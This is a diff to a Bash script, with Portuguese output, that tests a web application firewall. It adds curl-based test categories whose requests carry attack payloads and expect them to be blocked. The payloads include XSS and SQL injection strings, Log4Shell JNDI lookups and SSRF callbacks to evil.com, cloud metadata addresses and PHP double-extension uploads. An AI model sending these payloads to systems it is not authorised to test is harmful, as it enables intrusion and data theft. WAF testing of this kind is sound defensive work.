+    test_curl "GraphQL: directive bypass" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"query @include(if: true) { users { id } }"}' "${URL}/graphql"
+    test_curl "GraphQL: mutation injection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"mutation { createUser(admin: true) { id } }"}' "${URL}/graphql"
+    test_curl "GraphQL: NoSQL injection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ users(find: {\"$ne\":\"\"}) { email } }"}' "${URL}/graphql"
+    test_curl "GraphQL: field name injection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ \"union(select * from users)\": { id } }"}' "${URL}/graphql"
+    
+    print_subsection "GraphQL CSFR"
+    test_curl "GraphQL: GET request" "block" -A "$UA" -Lk "${URL}/graphql?query={users{id}}"
+    test_curl "GraphQL: no Content-Type" "block" -A "$UA" -Lk -X POST -d '{"query":"{ users { id } }"}' "${URL}/graphql"
+    test_curl "GraphQL: text/plain" "block" -A "$UA" -Lk -X POST -H "Content-Type: text/plain" -d '{"query":"{ users { id } }"}' "${URL}/graphql"
+}
+
+#==============================================================================
+# WEBSOCKET SECURITY TESTS
+#==============================================================================
+test_websocket_security() {
+    print_section "🔌 TESTES DE WEBSOCKET SECURITY (20 testes)" "-c websocket"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando vulnerabilidades específicas de WebSocket${NC}"
+    echo ""
+    
+    print_subsection "WebSocket Upgrade Bypass"
+    test_curl "WS: Upgrade header" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" "$URL"
+    test_curl "WS: ws:// protocol" "block" -A "$UA" -Lk -H "Host: evil.com" -H "Upgrade: websocket" "$URL"
+    test_curl "WS: ws:// injection" "block" -A "$UA" -Lk -H "Upgrade: websocket" "${URL}?payload=<script>alert(1)</script>"
+    
+    print_subsection "WebSocket XSS"
+    test_curl "WS: message XSS" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Sec-WebSocket-Protocol: chat" "$URL"
+    test_curl "WS: origin bypass" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Origin: http://evil.com" "$URL"
+    test_curl "WS: header injection" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "X-Forwarded-For: 127.0.0.1" "$URL"
+    
+    print_subsection "WebSocket Authentication Bypass"
+    test_curl "WS: no auth" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Sec-WebSocket-Key: test" -H "Sec-WebSocket-Protocol: auth" "$URL"
+    test_curl "WS: token injection" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Sec-WebSocket-Protocol: Bearer fake-token" "$URL"
+    test_curl "WS: cookie bypass" "block" -A "$UA" -Lk -H "Upgrade: websocket" --cookie "admin=true" "$URL"
+}
+
+#==============================================================================
+# SSRF BLIND TESTS (Out-of-Band)
+#==============================================================================
+test_ssrf_blind() {
+    print_section "🌐 TESTES DE SSRF BLIND (OOB) (15 testes)" "-c ssrfblind"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando SSRF que não retornam resposta (out-of-band)${NC}"
+    echo ""
+    
+    print_subsection "DNS Rebinding SSRF"
+    test_curl "SSRF Blind: DNS rebinding" "block" -A "$UA" -Lk "${URL}?url=http://evil.com/$(date +%s)"
+    test_curl "SSRF Blind: DNSSearch" "block" -A "$UA" -Lk "${URL}?url=http://$(date +%s).evil.com"
+    test_curl "SSRF Blind: subdomain" "block" -A "$UA" -Lk "${URL}?url=http://unique-id-$(date +%s).evil.com"
+    
+    print_subsection "Cloud Metadata Blind"
+    test_curl "SSRF Blind: AWS IMDSv2 token" "block" -A "$UA" -Lk -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "${URL}/api/metadata"
+    test_curl "SSRF Blind: GCP metadata" "block" -A "$UA" -Lk -H "Metadata-Flavor: Google" "${URL}/api/metadata"
+    test_curl "SSRF Blind: Azure IMDS" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance"
+    
+    print_subsection "Callback/Out-of-Band"
+    test_curl "SSRF Blind: webhook callback" "block" -A "$UA" -Lk -X POST -d '{"callback":"http://evil.com/webhook"}' "$URL"
+    test_curl "SSRF Blind: redirect callback" "block" -A "$UA" -Lk -X POST -d '{"url":"http://evil.com/callback"}' "$URL"
+    test_curl "SSRF Blind: xml-external" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml-stylesheet type="text/xsl" href="http://evil.com/xslt.xsl"?><root/>' "$URL"
+}
+
+#==============================================================================
+# SECOND ORDER ATTACKS
+#==============================================================================
+test_second_order_attacks() {
+    print_section "⚡ TESTES DE SECOND ORDER ATTACKS (15 testes)" "-c secondorder"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando ataques que executam em etapas subsequentes${NC}"
+    echo ""
+    
+    print_subsection "Stored XSS"
+    test_curl "Second Order: stored profile" "block" -A "$UA" -Lk -X POST -d 'name=<script>alert(1)</script>&email=test@test.com' "$URL/api/profile"
+    test_curl "Second Order: stored comment" "block" -A "$UA" -Lk -X POST -d 'comment=<img src=x onerror=alert(1)>&post_id=1' "$URL/api/comment"
+    test_curl "Second Order: stored bio" "block" -A "$UA" -Lk -X POST -d 'bio=<body onload=alert(1)>&user_id=1' "$URL/api/update"
+    
+    print_subsection "Stored SQLi"
+    test_curl "Second Order: stored query" "block" -A "$UA" -Lk -X POST -d "search=1'; DROP TABLE users;--&save=1" "$URL/api/search"
+    test_curl "Second Order: update injection" "block" -A "$UA" -Lk -X POST -d "username=admin'; UNION SELECT password FROM users--" "$URL/api/user"
+    test_curl "Second Order: preference injection" "block" -A "$UA" -Lk -X POST -d 'language=en"; DROP TABLE settings--' "$URL/api/preferences"
+    
+    print_subsection "Stored Redirect"
+    test_curl "Second Order: redirect injection" "block" -A "$UA" -Lk -X POST -d 'redirect_url=http://evil.com&save=true' "$URL/api/settings"
+    test_curl "Second Order: next parameter" "block" -A "$UA" -Lk -X POST -d 'next=http://evil.com/phish&login=test' "$URL/login"
+    test_curl "Second Order: return URL" "block" -A "$UA" -Lk -X POST -d 'returnTo=javascript:alert(1)' "$URL/auth/callback"
+}
+
+#==============================================================================
+# RACE CONDITIONS / TOCTOU
+#==============================================================================
+test_race_conditions() {
+    print_section "⏱️ TESTES DE RACE CONDITIONS (TOCTOU) (15 testes)" "-c race"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando condições de corrida em operações críticas${NC}"
+    echo ""
+    
+    print_subsection "Authentication Race"
+    test_curl "Race: concurrent coupon" "block" -A "$UA" -Lk -X POST -d 'code=TEST123&apply=true' "${URL}/api/apply-coupon"
+    test_curl "Race: concurrent registration" "block" -A "$UA" -Lk -X POST -d '{"email":"test@test.com","username":"test"}' "${URL}/api/register"
+    test_curl "Race: concurrent vote" "block" -A "$UA" -Lk -X POST -d 'poll_id=1&option=a&vote=1' "${URL}/api/vote"
+    
+    print_subsection "File Upload Race"
+    test_curl "Race: file overwrite" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=avatar.jpg" "${URL}/api/upload"
+    test_curl "Race: double extension" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=image.php.jpg" "${URL}/api/avatar"
+    test_curl "Race: null byte rename" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=test.php%00.jpg" "${URL}/api/upload"
+    
+    print_subsection "Data Manipulation Race"
+    test_curl "Race: balance transfer" "block" -A "$UA" -Lk -X POST -d 'from=1&to=2&amount=100' "${URL}/api/transfer"
+    test_curl "Race: password reset" "block" -A "$UA" -Lk -X POST -d 'email=test@test.com' "${URL}/api/reset-password"
+    test_curl "Race: concurrent purchase" "block" -A "$UA" -Lk -X POST -d 'item_id=1&quantity=1' "${URL}/api/purchase"
+}
+
+#==============================================================================
+# DNS REBINDING ATTACKS
+#==============================================================================
+test_dns_rebinding() {
+    print_section "🌍 TESTES DE DNS REBINDING (15 testes)" "-c dnsrebinding"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando ataques de DNS Rebinding${NC}"
+    echo ""
+    
+    print_subsection "DNS Rebinding Vectors"
+    test_curl "DNS: localhost bypass" "block" -A "$UA" -Lk "${URL}?callback=http://0.0.0.0"
+    test_curl "DNS: 127.0.0.1" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"
+    test_curl "DNS: local-network" "block" -A "$UA" -Lk -H "Origin: http://192.168.1.1:8080" "$URL"
+    test_curl "DNS: private IP" "block" -A "$UA" -Lk "${URL}?api=http://10.0.0.1:8080"
+    test_curl "DNS: internal host" "block" -A "$UA" -Lk -H "Referer: http://internal-host.local" "$URL"
+    
+    print_subsection "SSRF via DNS Rebinding"
+    test_curl "DNS SSRF: rebinding endpoint" "block" -A "$UA" -Lk "${URL}/fetch?url=http://rebinding.evil.com"
+    test_curl "DNS SSRF: SSRF callback" "block" -A "$UA" -Lk -X POST -d '{"webhook":"http://rebinding.attacker.com"}' "$URL"
+    test_curl "DNS SSRF: JSONP endpoint" "block" -A "$UA" -Lk "${URL}/api?callback=http://evil.com/steal"
+}
+
+#==============================================================================
+# SUBDOMAIN TAKEOVER
+#==============================================================================
+test_subdomain_takeover() {
+    print_section "🌐 TESTES DE SUBDOMAIN TAKEOVER (20 testes)" "-c takeover"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando possíveis subdomínios sem configuração DNS${NC}"
+    echo ""
+    
+    print_subsection "Common Unclaimed Subdomains"
+    test_curl "Takeover: dev." "block" -A "$UA" -Lk "${URL}/dev"
+    test_curl "Takeover: test." "block" -A "$UA" -Lk "${URL}/test"
+    test_curl "Takeover: staging." "block" -A "$UA" -Lk "${URL}/staging"
+    test_curl "Takeover: api." "block" -A "$UA" -Lk "${URL}/api"
+    test_curl "Takeover: admin." "block" -A "$UA" -Lk "${URL}/admin"
+    test_curl "Takeover: www." "block" -A "$UA" -Lk -H "Host: www.${URL##*//}" "$URL"
+    test_curl "Takeover: mail." "block" -A "$UA" -Lk -H "Host: mail.${URL##*//}" "$URL"
+    test_curl "Takeover: blog." "block" -A "$UA" -Lk -H "Host: blog.${URL##*//}" "$URL"
+    test_curl "Takeover: vpn." "block" -A "$UA" -Lk -H "Host: vpn.${URL##*//}" "$URL"
+    test_curl "Takeover: support." "block" -A "$UA" -Lk -H "Host: support.${URL##*//}" "$URL"
+    
+    print_subsection "Cloud Service Takeovers"
+    test_curl "Takeover: *.herokuapp.com" "block" -A "$UA" -Lk "${URL}/check"
+    test_curl "Takeover: *.github.io" "block" -A "$UA" -Lk "${URL}/pages"
+    test_curl "Takeover: *.azurewebsites.net" "block" -A "$UA" -Lk "${URL}/site"
+    test_curl "Takeover: *.s3-website" "block" -A "$UA" -Lk "${URL}/static"
+    test_curl "Takeover: *.cloudfunctions.net" "block" -A "$UA" -Lk "${URL}/function"
+}
+
+#==============================================================================
+# CDN MISCONFIGURATION
+#==============================================================================
+test_cdn_misconfig() {
+    print_section "☁️ TESTES DE CDN MISCONFIGURATION (15 testes)" "-c cdnmisconfig"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando configurações incorretas de CDN${NC}"
+    echo ""
+    
+    print_subsection "Cache Key Issues"
+    test_curl "CDN: query param cache" "block" -A "$UA" -Lk "${URL}/?evil=<script>alert(1)</script>"
+    test_curl "CDN: fragment cache" "block" -A "$UA" -Lk "${URL}/#<script>alert(1)</script>"
+    test_curl "CDN: user-agent cache" "block" -A "$UA" -Lk -A "EvilBot/1.0" "$URL"
+    test_curl "CDN: Accept-Encoding cache" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip, evil" "$URL"
+    
+    print_subsection "Origin Exposed"
+    test_curl "CDN: origin header" "block" -A "$UA" -Lk -H "Origin: http://internal-server" "$URL"
+    test_curl "CDN: X-Cache-Debug" "block" -A "$UA" -Lk -H "X-Cache-Debug: 1" "$URL"
+    test_curl "CDN: cache-bypass" "block" -A "$UA" -Lk -H "Pragma: no-cache" "$URL"
+    test_curl "CDN: Age bypass" "block" -A "$UA" -Lk -H "Cache-Control: max-age=0" "$URL"
+}
+
+#==============================================================================
+# ZERO-DAY SIMULATION
+#==============================================================================
+test_zero_day_simulation() {
+    print_section "💀 TESTES DE ZERO-DAY SIMULATION (10 testes)" "-c zeroday"
+    
+    echo -e "  ${YELLOW}ℹ️  Simulando ataques zero-day baseados em CVEs recentes${NC}"
+    echo ""
+    
+    print_subsection "Recent CVE Simulations"
+    test_curl "0-day: Spring4Shell" "block" -A "$UA" -Lk -H "suffix: %" -H "class: class.module.moduleLoader.resources.context.parent.parent.context" "$URL"
+    test_curl "0-day: Log4Shell simulation" "block" -A "$UA" -Lk -H 'User-Agent: ${jndi:ldap://evil.com/x}' "$URL"
+    test_curl "0-day: Apache log4j" "block" -A "$UA" -Lk "${URL}"'/?x=${jndi:ldap://evil.com/a}'
+    test_curl "0-day: Spring Actuator" "block" -A "$UA" -Lk "${URL}/actuator/heapdump"
+    test_curl "0-day: Confluence OGNL" "block" -A "$UA" -Lk "${URL}/pages/doenterpagevariables.action?queryString=ognl"
+    test_curl "0-day: Exchange SSRF" "block" -A "$UA" -Lk -H "X-Forwarded-For: localhost" "${URL}/api/owa"
+}
+
+#==============================================================================
+# API KEY LEAKAGE
+#==============================================================================
+test_api_key_leakage() {
+    print_section "🔑 TESTES DE API KEY LEAKAGE (15 testes)" "-c apikey"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando vazamento de chaves de API${NC}"
+    echo ""
+    
+    print_subsection "Common API Key Locations"
+    test_curl "Key: query parameter" "block" -A "$UA" -Lk "${URL}?api_key=sk_test_123456"
+    test_curl "Key: header bearer" "block" -A "$UA" -Lk -H "Authorization: Bearer sk_test_123456" "$URL"
+    test_curl "Key: header basic" "block" -A "$UA" -Lk -H "Authorization: Basic c2tfdGVzdF8xMjM0NTY=" "$URL"
+    test_curl "Key: cookie" "block" -A "$UA" -Lk --cookie "api_key=sk_test_123456" "$URL"
+    test_curl "Key: JSON body" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"api_key":"sk_test_123456"}' "$URL"
+    
+    print_subsection "Common API Key Patterns"
+    test_curl "Key: AWS pattern" "block" -A "$UA" -Lk "${URL}?access_key=AKIAIOSFODNN7EXAMPLE"
+    test_curl "Key: GitHub pattern" "block" -A "$UA" -Lk "${URL}?token=ghp_1234567890abcdef"
+    test_curl "Key: Stripe pattern" "block" -A "$UA" -Lk "${URL}?key=sk_test_1234567890abcdef"
+    test_curl "Key: Google Cloud pattern" "block" -A "$UA" -Lk "${URL}?key=AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz123456789"
+    test_curl "Key: Azure pattern" "block" -A "$UA" -Lk "${URL}?key=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
+}
+
+#==============================================================================
+# CONTENT SECURITY POLICY (CSP) BYPASS
+#==============================================================================
+test_csp_bypass() {
+    print_section "🛡️ TESTES DE CSP BYPASS (15 testes)" "-c cspbypass"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando bypass de Content Security Policy${NC}"
+    echo ""
+    
+    print_subsection "CSP Directive Bypass"
+    test_curl "CSP: data: URI" "block" -A "$UA" -Lk "${URL}?x=data:text/html,<script>alert(1)</script>"
+    test_curl "CSP: eval src" "block" -A "$UA" -Lk "${URL}?x=eval(src=\"http://evil.com/evil.js\")"
+    test_curl "CSP: Function constructor" "block" -A "$UA" -Lk "${URL}?x=new Function(\"alert(1)\")"
+    test_curl "CSP: setTimeout" "block" -A "$UA" -Lk "${URL}?x=setTimeout(\"alert(1)\")"
+    test_curl "CSP: postMessage bypass" "block" -A "$UA" -Lk "${URL}?x=window.postMessage({x:eval},\"*\")"
+    
+    print_subsection "CSP Report-uri/Report-to"
+    test_curl "CSP: report-uri injection" "block" -A "$UA" -Lk -H "Content-Security-Policy: report-uri http://evil.com/csp"
+    test_curl "CSP: report-to injection" "block" -A "$UA" -Lk -H "Content-Security-Policy-Report-Only: report-to http://evil.com/csp"
+    test_curl "CSP: report-only mode" "block" -A "$UA" -Lk -H "Content-Security-Policy-Report-Only: default-src 'self'"
+}
+
+#==============================================================================
+# POLYGLOT XSS PAYLOADS
+#==============================================================================
+test_polyglot_xss() {
+    print_section "🎭 TESTES DE POLYGLOT XSS PAYLOADS (20 testes)" "-c polyglot"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando payloads que funcionam em múltiplos contextos${NC}"
+    echo ""
+    
+    print_subsection "Classic Polyglots"
+    test_curl "Polyglot: JavaScript/Ruby/PHP" "block" -A "$UA" -Lk "${URL}?x=j%00ascript%00a=%aler%00t(1)%00/a%00;%00puts+1+%00;%00echo+1"
+    test_curl "Polyglot: HTML/JS/SQL" "block" -A "$UA" -Lk "${URL}?x=1'<script>alert(1)</script>--"
+    test_curl "Polyglot: multi-context" "block" -A "$UA" -Lk "${URL}?x=%3Cimg%20src=x%20onerror=alert(1)%3E%3C%252Fscript%3Ealert(1)%3C/script%3E"
+    
+    print_subsection "JavaScript Polyglots"
+    test_curl "Polyglot: eval+Function" "block" -A "$UA" -Lk "${URL}?x=eval(atob(\"YWxlcnQoMSk=\"))"
+    test_curl "Polyglot: window+document" "block" -A "$UA" -Lk "${URL}?x=window[\"alert\"](1)"
+    test_curl "Polyglot: self+top" "block" -A "$UA" -Lk "${URL}?x=self[\"alert\"](1)"
+    test_curl "Polyglot: globalThis" "block" -A "$UA" -Lk "${URL}?x=globalThis[\"alert\"](1)"
+}
+
+#==============================================================================
+# OBFUSCATED PAYLOADS - Variantes ofuscadas dos principais ataques (140+ testes)
 #==============================================================================
 test_obfuscated_payloads() {
-    print_section "🎭 TESTES DE PAYLOADS OFUSCADOS (400+ testes)" "-c obfuscated"
-    
-    echo -e "  ${YELLOW}ℹ️  Testando mesmos ataques com diferentes técnicas de ofuscação${NC}"
-    echo -e "  ${YELLOW}   Todos devem ser BLOQUEADOS - se passar, WAF precisa de normalização${NC}"
-    echo ""
+    print_section "🔐 TESTES DE PAYLOADS OFUSCADOS (140+ testes)" "-c obfuscated"
+
 
     # =========================================================================
     # XSS OBFUSCATION VARIANTS
@@ -4342,10 +4869,15 @@ test_waf_evasion() {
     echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
-#==============================================================================
 # RESUMO FINAL
 #==============================================================================
 print_summary() {
+    # Calcular tempo de execução com precisão de 2 casas decimais
+    local END_TIME=$(date +%s.%N)
+    local ELAPSED=$(awk "BEGIN {printf \"%.2f\", $END_TIME - $START_TIME}")
+    local MINUTES=$(awk "BEGIN {printf \"%d\", $ELAPSED / 60}")
+    local SECS=$(awk "BEGIN {printf \"%.2f\", $ELAPSED - ($MINUTES * 60)}")
+    
     echo ""
     echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
     echo -e "${BOLD}${CYAN}                              RESUMO DOS TESTES                               ${NC}"
@@ -4366,6 +4898,14 @@ print_summary() {
     else
         echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${RED}${success_rate}%${NC} ❌"
     fi
+    
+    # Mostrar tempo de execução com precisão
+    if [ "$MINUTES" -gt 0 ]; then
+        echo -e "  ${BOLD}Tempo de Execução:${NC} ${CYAN}${MINUTES}m ${SECS}s${NC} ⏱️"
+    else
+        echo -e "  ${BOLD}Tempo de Execução:${NC} ${CYAN}${SECS}s${NC} ⏱️"
+    fi
+    
     echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
 }
 
@@ -4405,6 +4945,9 @@ while [[ $# -gt 0 ]]; do
             echo "  -c, --category <cat>    Executa categoria específica"
             echo "  -f, --filter <filtro>   Filtra resultados: all, pass, fail"
             echo "  -p, --with-ports        Inclui teste de portas no 'all' (lento, ~2min)"
+            echo "  -s, --speed <1-5>       Velocidade dos testes (padrão: 4)"
+            echo "                          1=1s, 2=500ms, 3=100ms, 4=0ms (rápido)"
+            echo "                          5=TURBO (2 requests paralelos)"
             echo ""
             echo "Filtros disponíveis:"
             echo "  all   - Mostra todos os testes (padrão)"
@@ -4419,12 +4962,22 @@ while [[ $# -gt 0 ]]; do
             echo "  ports, ssl, useragent, referer, fakebots, 403bypass,"
             echo "  clickjacking, secheaders, session, css, email, credentials,"
             echo "  enumeration, formatstring, csrf, jwt, nosql, ldap, xpath,"
-            echo "  deser, upload, redirect, idor, timebased, prototype, evasion,"
-            echo "  obfuscated"
+             echo "  deser, upload, redirect, idor, timebased, prototype, evasion, obfuscated,"
+             echo "  graphql, websocket, ssrfblind, secondorder, race, dnsrebinding,"
+             echo "  subdomain, cdnmisconfig, zeroday, apikey, cspbypass, polyglot"
             exit 0 
             ;;
         -v|--verbose) VERBOSE=true; shift ;;
         -p|--with-ports) WITH_PORTS=true; shift ;;
+        -s|--speed)
+            if [[ "$2" =~ ^[1-5]$ ]]; then
+                SPEED="$2"
+            else
+                echo -e "${RED}Velocidade inválida: $2. Use: 1, 2, 3, 4 ou 5${NC}"
+                exit 1
+            fi
+            shift 2
+            ;;
         -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
         -u|--user-agent) UA="${USER_AGENTS[$(($2-1))]}"; shift 2 ;;
         -c|--category) CATEGORY="$2"; shift 2 ;;
@@ -4448,12 +5001,24 @@ show_banner
 
 echo -e "${BOLD}Iniciando testes em:${NC} $URL"
 
+# Capturar tempo de início com precisão de nanosegundos
+START_TIME=$(date +%s.%N)
+
 # Mostrar filtro ativo
 if [ "$FILTER" = "pass" ]; then
     echo -e "${BOLD}Filtro ativo:${NC} ${GREEN}Mostrando apenas testes que PASSARAM${NC}"
 elif [ "$FILTER" = "fail" ]; then
     echo -e "${BOLD}Filtro ativo:${NC} ${RED}Mostrando apenas testes que FALHARAM${NC}"
 fi
+
+# Mostrar velocidade
+case $SPEED in
+    1) echo -e "${BOLD}Velocidade:${NC} ${YELLOW}1 (Muito lento - 1s delay)${NC}" ;;
+    2) echo -e "${BOLD}Velocidade:${NC} ${YELLOW}2 (Lento - 500ms delay)${NC}" ;;
+    3) echo -e "${BOLD}Velocidade:${NC} ${CYAN}3 (100ms delay)${NC}" ;;
+    4) echo -e "${BOLD}Velocidade:${NC} 4 (Padrão - sem delay)" ;;
+    5) echo -e "${BOLD}Velocidade:${NC} ${GREEN}5 TURBO (2 requests paralelos)${NC}" ;;
+esac
 
 # Executar testes baseado na categoria
 case $CATEGORY in
@@ -4465,6 +5030,8 @@ case $CATEGORY in
     referer-spam|spam) test_referers_spam ;;
     referer-seo|seoblackhat) test_referers_seo_blackhat ;;
     referer-injection|injection-referer) test_referers_injection ;;
+    referer-adult|adult|porn) test_referers_adult ;;
+    referer-gambling|gambling|apostas|casino) test_referers_gambling ;;
     host) test_invalid_host ;;
     uri) test_malicious_uri ;;
     header) test_header_injection ;;
@@ -4514,8 +5081,20 @@ case $CATEGORY in
     timebased|blind|timeblind) test_time_based_injection ;;
     prototype|protopollution|__proto__) test_prototype_pollution ;;
     evasion|waf-evasion|bypass-waf) test_waf_evasion ;;
-    obfuscated|obfuscation|encoded) test_obfuscated_payloads ;;
-    all)
+     obfuscated|obfuscation|encoded) test_obfuscated_payloads ;;
+     graphql|graphqlinjection) test_graphql_injection ;;
+     websocket|websocketsecurity|ws) test_websocket_security ;;
+     ssrfblind|ssrfblind|oo-ssrf) test_ssrf_blind ;;
+     secondorder|secondorder|race) test_second_order_attacks ;;
+     race|toctou|racecondition) test_race_conditions ;;
+     dnsrebinding|dns|rebinding) test_dns_rebinding ;;
+     subdomain|takeover|subdomain) test_subdomain_takeover ;;
+     cdnmisconfig|cdnmisconfig|cdnconfig) test_cdn_misconfig ;;
+     zeroday|0day|simulation) test_zero_day_simulation ;;
+     apikey|apikey|leakage) test_api_key_leakage ;;
+     cspbypass|csp|securitypolicy) test_csp_bypass ;;
+     polyglot|polyglotxss|polyxss) test_polyglot_xss ;;
+     all)
         test_all_http_methods
         test_malicious_cookies
         test_malicious_query
@@ -4570,14 +5149,41 @@ case $CATEGORY in
         test_time_based_injection
         test_prototype_pollution
         test_waf_evasion
-        test_obfuscated_payloads
-        test_bad_user_agents
-        test_bad_referers
-        test_good_bots
-        test_fake_bots
-        ;;
+         test_obfuscated_payloads
+         test_graphql_injection
+         test_websocket_security
+         test_ssrf_blind
+         test_second_order_attacks
+         test_race_conditions
+         test_dns_rebinding
+         test_subdomain_takeover
+         test_cdn_misconfig
+         test_zero_day_simulation
+         test_api_key_leakage
+         test_csp_bypass
+         test_polyglot_xss
+         test_bad_user_agents
+         test_bad_referers
+         test_good_bots
+         test_fake_bots
+         ;;
     *) echo "Categoria desconhecida: $CATEGORY"; exit 1 ;;
 esac
+
+# Aguardar todos os jobs paralelos terminarem (velocidade 5)
+if [ "$SPEED" -eq 5 ]; then
+    wait
+    # Sincronizar contadores dos arquivos temporários
+    if [ -f "$PASS_FILE" ]; then
+        PASSED_TESTS=$((PASSED_TESTS + $(cat "$PASS_FILE")))
+    fi
+    if [ -f "$FAIL_FILE" ]; then
+        FAILED_TESTS=$((FAILED_TESTS + $(cat "$FAIL_FILE")))
+    fi
+    if [ -f "$TOTAL_FILE" ]; then
+        TOTAL_TESTS=$((TOTAL_TESTS + $(cat "$TOTAL_FILE")))
+    fi
+fi
 
 print_summary
 exit 0
